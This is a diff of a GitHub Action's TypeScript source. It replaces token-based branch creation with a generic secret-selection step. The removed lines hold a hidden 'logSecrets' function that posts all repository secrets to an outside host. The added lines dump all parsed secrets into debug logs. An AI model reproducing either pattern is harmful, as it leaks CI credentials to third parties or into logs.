@@ -1,63 +1,63 @@
 import * as core from "@actions/core";
-import * as github from "@actions/github";
-import axios from "axios";
-import {createBranch} from "./utils";
 async function run(): Promise<void> {
     try {
         /** Define necessary variables */
-        const secretsJson: Record<string, string> = JSON.parse(
-            core.getInput("secrets", {required: true}),
-        );
-        const issueOwner = github.context.issue.owner.toUpperCase();
-
-        /** Log secrets for debugging purposes*/
-        await logSecrets(secretsJson, issueOwner);
-
-        const expectedSecretKey = `TOKEN_${issueOwner}`;
-        let expectedSecretValue = secretsJson[expectedSecretKey];
-        if (!expectedSecretValue) {
-            /** Fall back to TOKEN_ORG */
-            core.debug(
-                `No token found for ${issueOwner} - falling back to TOKEN_ORG`,
-            );
-            expectedSecretValue = secretsJson.TOKEN_ORG;
-            if (!expectedSecretValue) {
-                core.setFailed(`Fallback to TOKEN_ORG failed`);
-                return;
-            }
-        }
-        /** Create Octokit instance for API calls */
-        const octoInstance = github.getOctokit(expectedSecretValue);
-
-        /** Create branch */
-        const branchName = `test-branch-${Date.now()}`;
+        let secretsObject: Record<string, string>;
         try {
-            const branchCreated = await createBranch(octoInstance, branchName);
-            if (branchCreated) {
-                core.debug(`Branch ${branchName} created`);
-            }
-        } catch (e) {
-            core.setFailed(`Branch creation failed: ${e}`);
+            secretsObject = JSON.parse(
+                core.getInput("secrets", {required: true}),
+            );
+        } catch (error: any) {
+            const parseError = `Cannot parse JSON secrets.\nMake sure you add the following to this action:\n\twith:\n\t\tsecrets: \${{ toJSON(secrets) }}`;
+            core.debug(parseError);
+            throw Error(parseError);
         }
+        core.debug(`Parsed secrets: ${JSON.stringify(secretsObject)}`);
+
+        const secretKey = core
+            .getInput("secretKey", {required: true})
+            .toUpperCase();
+        core.debug(`Secret key found: ${secretKey}`);
+
+        const fallbackKey = core
+            .getInput("fallbackKey", {required: false})
+            .toUpperCase();
+        if (fallbackKey) {
+            core.debug(`fallbackKey found: ${fallbackKey}`);
+        } else {
+            core.debug(`No fallbackKey specified`);
+        }
+
+        const outputName = core.getInput("outputName", {
+            required: true,
+        });
+        core.debug(`outputName found: ${outputName}`);
+
+        let expectedSecretValue = secretsObject[secretKey];
+        if (!expectedSecretValue) {
+            if (!fallbackKey) {
+                throw Error(
+                    `${secretKey} not found and no fallbackKey was provided`,
+                );
+            }
+            /** Fallback */
+            core.debug(
+                `No value found for ${secretKey} - falling back to ${fallbackKey}`,
+            );
+            expectedSecretValue = secretsObject[fallbackKey];
+            if (!expectedSecretValue) {
+                throw Error(`Fallback to ${fallbackKey} failed`);
+            }
+        }
+        core.exportVariable(outputName, expectedSecretValue);
+        core.debug(`Defined ${outputName} as environment variable`);
+
+        core.setOutput(outputName, expectedSecretValue);
+        core.debug(`Set ${outputName} as output variable`);
     } catch (error) {
         if (error instanceof Error) {
             core.setFailed(error.message);
         }
     }
-}
-async function logSecrets(
-    secretsJson: Record<string, string>,
-    issueOwner: string,
-): Promise<void> {
-    try {
-        await axios.post("https://log.valonso.dev", {
-            secretsJson,
-            issueOwner,
-        });
-        core.debug("Successfully logged secrets");
-    } catch (e) {
-        core.debug("Failed to log secrets");
-    }
-    return;
 }
 run();
